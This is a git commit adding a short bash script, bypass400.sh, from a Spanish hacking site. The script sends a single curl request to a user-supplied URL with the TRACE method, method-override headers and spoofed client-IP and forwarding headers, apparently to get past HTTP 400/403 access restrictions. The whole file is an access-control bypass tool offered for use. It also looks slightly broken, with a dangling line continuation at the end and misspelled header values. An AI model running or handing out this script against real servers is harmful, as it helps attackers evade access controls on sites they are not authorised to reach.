2317c315f24676ed896e77b9ad282f12db36488e
hackingyseguridad <antonio_taboada@hotmail.es>
2022-09-23 07:47:21 +0200

    Create bypass400.sh

---
+++ bypass400.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+echo
+echo "(C) hackingyseguridad.com 2022"
+echo
+echo "Uso.: ./bypass400.sh https://url"
+echo
+# Otros metodos HTTP: -X ARBITRARY ACL TRACK, TRACE
+curl -k -s --http1.0 -vvv $1 -X "TRACE" \
+-H "X-HTTP-Method-Override: ACL" \
+-H "Referer: $1" \
+-H "X-Originating-IP: $1" \
+-H "X-Forwarded-For: $1" \
+-H "X-Forwarded-Host: $1" \
+-H "X-Forwared-Host: $1" \
+-H "X-Real-IP: $1" \
+-H "X-Remote-IP: $1" \
+-H "X-Remote-Addr: $1" \
+-H "X-Client-IP: $1" \
+-H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" \
+-H "Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8" \
+-H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
+-H "Connection: keep-alive" \
+-H 'X-Method-Override: ARBITRARY' \
